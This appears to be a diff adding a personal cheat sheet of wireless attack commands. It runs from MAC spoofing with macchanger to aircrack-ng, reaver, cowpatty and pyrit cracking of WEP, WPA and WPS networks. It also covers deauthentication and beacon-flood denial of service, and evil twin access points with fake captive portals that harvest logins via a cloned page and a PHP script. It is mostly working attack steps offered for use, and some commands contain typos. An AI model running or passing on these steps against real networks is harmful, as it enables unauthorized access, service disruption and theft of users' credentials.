@@ -1,0 +1,170 @@
+--How to Change Mac Address in Kali Linux
+method 01:::
+macchanger -s eth0
+sudo ifconfig eth0 down
+sudo macchanger -r eth0
+macchanger -s  eth0
+
+macchanger --help
+macchanger -s eth0
+ifconfig
+macchanger -r eth0
+macchanger --mac=XX.XX.XX.XX.XX eth0
+macchanger -s eth0
+macchanger -p eth0
+macchanger -s eth0
+
+ifconfig wlan0 down
+macchanger -r wlan0
+macchanger -m XX.XX.XX.XX.XX wlan0
+ifconfig wlan0 up
+
+macchanger -s eth0
+ifconfig eth0 down
+macchanger -r eth0
+ifconfig eth0 down
+macchanger -s eth0
+
+ifconfig eth0 down
+macchanger -m 00:d0:70:00:20:69 eth0
+ifconfig eth0 up
+macchanger -s eth0
+
+macchanger --random wlan0
+
+Extra : https://computingpost.medium.com/how-to-change-your-mac-address-in-kali-linux-and-linux-f09e6721f8c6
+
+airmon-ng : Placing different cards in monitor mode
+aircrack-ng : Wireless key cracking program
+airodump-ng : Packet Sniffer
+aireplay-ng : Packet Injector
+airbase-ng : Configure fake access points
+airdecap-ng : Decrypts WEP/WPA/WAP encrypt
+
+--Packet injection and monitor mode:
+aireplay-ng -9 wlan0
+airmon-ng start wlan0
+airmon-ng check kill
+iwconfig 
+
+--Hidden WireLess Networks:
+airmon-ng start wlan0
+airodump wlan0
+airodump-ng -c {CH Num} --bssid {bssid} wlan0
+aireplay-ng -0 20 -a {bssid} wlan0 [another terminal]
+
+--Spoof your Mac Address:
+ifconfig wlan0 down
+macchanger -r wlan0
+macchanger -m XX.XX.XX.XX.XX wlan0
+ifconfig wlan0 up
+
+--DOS Attack:
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng -c {CH Num} --bssid {bssid} wlan0
+aireplay-ng -0 1000 -a {bssid} wlan0
+mdk3 wlan0 b -c 5
+mdk3 wlan0 b -c 5 -f '/root/Desktop/file'
+
+--WiFi Networks with WEP encryption:
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng -c {channel} -w wifiname --bssid {mac} wlan0
+aireplay-ng -l 0 -a {mac} wlan0 [another terminal]
+aireplay-ng -3 -b {mac} wlan0
+aircrack-ng name.cap
+wifite
+
+--hack WiFi Networks with WPA/WPA2 encryption:
+iwconfig
+airedump-ng wlan0
+airodump-ng -c {channel} -w wifiname -bssid {mac} wlan0
+aireplay-ng -0 20 -a {mac} wlan0[another terminal]
+aircrack-ng -w rockyou.txt name.cap
+
+--Speeding up WPA2 Cracking:
+cowpatty
+cowpatty -f wordlist.txt -r wifi.cap -s {SSID}
+genpmk
+genpmk -f wordlist.txt -d wifi -s {wifi SSid}
+cowpatty -d wifi -r -r wpa.cap -s {wifi SSid}
+
+--hack WiFi Networks using Pyrit:
+pyrit list cores
+pyrit -r name.cap -i wordlist.txt attack_passthrough
+pyrit -i wordlist.txt import_passwords
+pyrit -e {wifi SSid} create_essid
+pyrit eval
+pyrit batch
+pyrit -r name.cap attack_db
+pyrit -e {wifi SSid} delete_essid
+rm -rf .pyrit/blobspace/password
+
+--How to hack WiFi Networks with Reaver:
+iwconfig
+wash -i wlan0
+reaver -i wlan0 -b {bssid mac} -c 6 -vv -f
+
+--Evil Twin:
+iwconfig
+airmon-ng start wlan0
+iwconfig
+aireplay-ng --test wlan0
+
+-DOS Attack:
+airodump-ng wlan0
+airodump-ng --bbsid {mac} -c {channel} -w capture
+aireplay-ng --deauth 10 -a {mac} wlan0
+aireplay-ng --deauth 0 -a <MAC> wlan0 
+
+--setup a access point
+apt install dnsmasq hostapd
+airmon-ng check kill
+dnsmasq -C /root/dnsmasq.conf
+hostapd /root/hostapd.conf
+airbase-ng -e Test -c 6 wlan0
+
+-setup a Captive portal:
+dnsmasq -C /root/dnsmasq.conf
+hostapd /root/hostapd.conf -B
+ifconfig wlan0 192.168.1.1/24
+copy the basic portal files to /var/www/html
+nano Apache-Rewrite and copy this text
+nano /etc/apache2/sites-enabled/000-default.conf and paste it
+
+Sniff login Details:
+tshark -i wlan0 -w capture.cap
+
+Capture the Login Information using a PhP Script:
+cd /var/www/html and paste the php and txt file
+service apache2 restart
+
+an Access Point with a Fake Captive Portal:
+hostapd /root/hostapd.conf -B
+httrack www.abc.com/etc/lf/login/index.html
+tshark -i wlan0 -w capture
+airodump-ng wlan0
+aireplay-ng -0 0 -a {mac} wlan0 -D
+
+Stealing Credentials with the Social Engineering Toolkit:
+settoolkit : https://github.com/trustedsec/social-engineer-toolkit
+1 > 2 > 3 > 3 > ip > path > 2 > ip 
+
+Set up an Access Point with Internet Access:
+sudo apt install bridge-utils
+brctl addbr br0
+brctl addif br0 eth0
+ifconfig br0 up 
+nano hostapd.conf > bridge=br0
+hostapd /root/hostapd.conf -B
+mdk3 wlan0 d -c 1
+
+tool : https://github.com/v1s1t0r1sh3r3/airgeddon
+tool : https://github.com/s0meguy1/RougeWifi
+tool : https://github.com/P0cL4bs/wifipumpkin3
+tool : https://github.com/zackhaikal/WiFi-Pumpkin
+
+Course : https://www.udemy.com/course/complete-wifi-hacking-course/
+
+
